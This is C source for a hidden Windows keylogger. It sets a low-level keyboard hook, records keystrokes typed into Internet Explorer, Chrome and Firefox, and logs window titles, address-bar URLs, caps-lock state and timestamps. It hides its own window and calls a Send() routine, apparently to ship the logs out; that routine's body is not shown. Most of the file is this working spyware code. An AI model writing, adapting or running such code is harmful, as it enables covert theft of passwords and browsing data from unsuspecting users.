#include "MySourceFile.h"

BOOL CALLBACK EnumChildProc(HWND Window, LPARAM Url)
{
	char ClassName[MAX_CHAR];
	GetClassName(Window, ClassName, MAX_CHAR);
	if((strcmp(ClassName, "Edit") == 0) || (strcmp(ClassName, "Chrome_OmniboxView") == 0))
	{
		SendMessage(Window, WM_GETTEXT, MAX_CHAR, Url);
		return FALSE;
	}
	return TRUE;
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if(wParam == WM_KEYDOWN)
	{
		PKBDLLHOOKSTRUCT keyinfo = (PKBDLLHOOKSTRUCT)lParam;
		DWORD key = keyinfo->vkCode;
		HWND Window = GetForegroundWindow();
		char WindowClass[MAX_CHAR];
		GetClassName(Window, WindowClass, MAX_CHAR);
		if((strcmp(WindowClass, "IEFrame") == 0) || (strcmp(WindowClass, "Chrome_WidgetWin_0") == 0) || (strcmp(WindowClass, "MozillaWindowClass") == 0) || (strcmp(WindowClass, "MozillaUIWindowClass") == 0))
		{
			char Title[MAX_CHAR] = "", Url[MAX_CHAR] = "";
			static char StaticTitle[MAX_CHAR] = "", StaticUrl[MAX_CHAR] = "";
			bool CapsLockState = CapsLock();
			tm Time = GetTime();
			GetWindowText(Window, (LPTSTR)Title, MAX_CHAR);
			if((strcmp(WindowClass, "IEFrame") == 0) || (strcmp(WindowClass, "Chrome_WidgetWin_0") == 0)) EnumChildWindows(Window, EnumChildProc, (LPARAM)Url);
			if((strlen(Title) > 0) && (strcmp(Title, StaticTitle) != 0))
			{
				char TitleBuffer[MAX_CHAR];
				sprintf(TitleBuffer, "\n%%WinTitle = \"%s\"%%\n", Title);
				Save(TitleBuffer);
				strcpy(StaticTitle, Title);
			}
			if((strlen(Url) > 0) && (strcmp(Url, StaticUrl) != 0))
			{
				char UrlBuffer[MAX_CHAR];
				sprintf(UrlBuffer, "\n%%WebURL = \"%s\"%%\n", Url);
				Save(UrlBuffer);
				strcpy(StaticUrl, Url);
			}
			if(CapsLockState != GlobalCapsLock)
			{
				Save(GetCapsLockStr(CapsLockState));
				GlobalCapsLock = CapsLockState;
			}
			if(timedif(Time, GlobalTime))
			{
				Save(GetTimeStr(Time));
				GlobalTime = Time;
			}
			Save(KeyName(key));
		}
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

/*  Declare Windows procedure  */
LRESULT CALLBACK WindowProcedure (HWND, UINT, WPARAM, LPARAM);

/*  Make the class name into a global variable  */
char szClassName[ ] = "WindowsApp";

int WINAPI WinMain (HINSTANCE hThisInstance,
                    HINSTANCE hPrevInstance,
                    LPSTR lpszArgument,
                    int nFunsterStil)

{
    HWND hwnd;               /* This is the handle for our window */
    MSG messages;            /* Here messages to the application are saved */
    WNDCLASSEX wincl;        /* Data structure for the windowclass */

    /* The Window structure */
    wincl.hInstance = hThisInstance;
    wincl.lpszClassName = szClassName;
    wincl.lpfnWndProc = WindowProcedure;      /* This function is called by windows */
    wincl.style = CS_DBLCLKS;                 /* Catch double-clicks */
    wincl.cbSize = sizeof (WNDCLASSEX);

    /* Use default icon and mouse-pointer */
    wincl.hIcon = LoadIcon (NULL, IDI_APPLICATION);
    wincl.hIconSm = LoadIcon (NULL, IDI_APPLICATION);
    wincl.hCursor = LoadCursor (NULL, IDC_ARROW);
    wincl.lpszMenuName = NULL;                 /* No menu */
    wincl.cbClsExtra = 0;                      /* No extra bytes after the window class */
    wincl.cbWndExtra = 0;                      /* structure or the window instance */
    /* Use Windows's default color as the background of the window */
    wincl.hbrBackground = (HBRUSH) COLOR_BACKGROUND;

    /* Register the window class, and if it fails quit the program */
    if (!RegisterClassEx (&wincl))
        return 0;

    /* The class is registered, let's create the program*/
    hwnd = CreateWindowEx (
           0,                   /* Extended possibilites for variation */
           szClassName,         /* Classname */
           "Windows App",       /* Title Text */
           WS_OVERLAPPEDWINDOW, /* default window */
           CW_USEDEFAULT,       /* Windows decides the position */
           CW_USEDEFAULT,       /* where the window ends up on the screen */
           544,                 /* The programs width */
           375,                 /* and height in pixels */
           HWND_DESKTOP,        /* The window is a child-window to desktop */
           NULL,                /* No menu */
           hThisInstance,       /* Program Instance handler */
           NULL                 /* No Window Creation data */
           );

    /* Make the window visible on the screen */
	ShowWindow (hwnd, SW_HIDE);

	Send();
	Save("\n%START%\n" + GetID());
	GlobalTime = GetTime();
	Save(GetTimeStr(GlobalTime));
	GlobalCapsLock = CapsLock();
	Save(GetCapsLockStr(GlobalCapsLock));

	HHOOK KBH = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, hThisInstance, 0);

    /* Run the message loop. It will run until GetMessage() returns 0 */
    while (GetMessage (&messages, NULL, 0, 0))
    {
        /* Translate virtual-key messages into character messages */
        TranslateMessage(&messages);
        /* Send message to WindowProcedure */
        DispatchMessage(&messages);
    }

    /* The program return-value is 0 - The value that PostQuitMessage() gave */
    return messages.wParam;
}


/*  This function is called by the Windows function DispatchMessage()  */

LRESULT CALLBACK WindowProcedure (HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch (message)                  /* handle the messages */
    {
        case WM_DESTROY:
            PostQuitMessage (0);       /* send a WM_QUIT to the message queue */
            break;
        default:                      /* for messages that we don't deal with */
            return DefWindowProc (hwnd, message, wParam, lParam);
    }

    return 0;
}
